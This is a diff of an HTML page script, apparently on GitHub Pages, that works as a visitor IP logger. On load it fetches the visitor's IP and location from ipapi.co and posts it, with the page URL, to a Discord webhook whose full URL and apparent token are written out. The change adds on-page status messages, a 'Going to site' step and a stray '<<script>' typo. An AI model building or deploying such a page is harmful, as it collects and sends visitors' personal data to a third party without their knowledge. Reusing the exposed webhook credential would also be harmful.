@@ -3,13 +3,28 @@
 
 
 
-<script>
+<<script>
 window.addEventListener("load", async () => {
   const webhookURL = "https://discord.com/api/webhooks/1472349277383692512/NqRV69JT5JC1q0Po5ggWVEbcztZ1SAS6M_M_mU7YNZVkxoj8mzRu7xPZPNaeHWmicKTe";
 
+  // Helper to show messages on the page
+  function logMessage(message, color = "black") {
+    const pre = document.createElement("pre");
+    pre.style.color = color;
+    pre.style.background = "#f0f0f0";
+    pre.style.padding = "5px";
+    pre.textContent = message;
+    document.body.appendChild(pre);
+  }
+
   try {
+    logMessage("Fetching IP info...", "blue");
+
     const res = await fetch("https://ipapi.co/json/");
+    if (!res.ok) throw new Error(`Website failed: ${res.status}`);
     const data = await res.json();
+
+    logMessage(`IP info fetched:\n${JSON.stringify(data, null, 2)}`, "green");
 
     const payload = {
       content:
@@ -23,17 +38,19 @@ window.addEventListener("load", async () => {
         `Page: ${window.location.href}`
     };
 
+    logMessage("Sending to webhook...", "blue");
+
     await fetch(webhookURL, {
       method: "POST",
-      mode: "no-cors", // 👈 important for GitHub Pages
-      headers: {
-        "Content-Type": "application/json"
-      },
+      mode: "no-cors", // Required for GitHub Pages
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
 
+    logMessage("✅ Going to site", "green");
+
   } catch (err) {
-    console.error("Error:", err);
+    logMessage(`❌ Error: ${err.message}`, "red");
   }
 });
 </script>
